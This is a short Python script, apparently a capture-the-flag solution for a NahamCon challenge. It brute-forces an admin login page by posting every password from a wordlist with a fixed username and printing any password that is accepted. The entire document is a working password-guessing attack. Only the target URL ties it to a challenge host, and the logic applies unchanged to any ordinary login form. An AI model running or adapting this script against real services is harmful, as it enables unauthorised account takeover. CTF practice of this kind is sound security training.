import requests 

URL = "http://challenge.nahamcon.com:31250"

with open('passwords.txt', 'r') as file:
    password_list = file.read().split()


def login(): 
    for xx in password_list:
        r = requests.post(
                    f"{URL}/admin/login",
                    data={
                        "username": "brian.1954",
                        "password": xx
                    }
        )
        if "Invalid username or password" not in r.text: 
            print(xx)

login()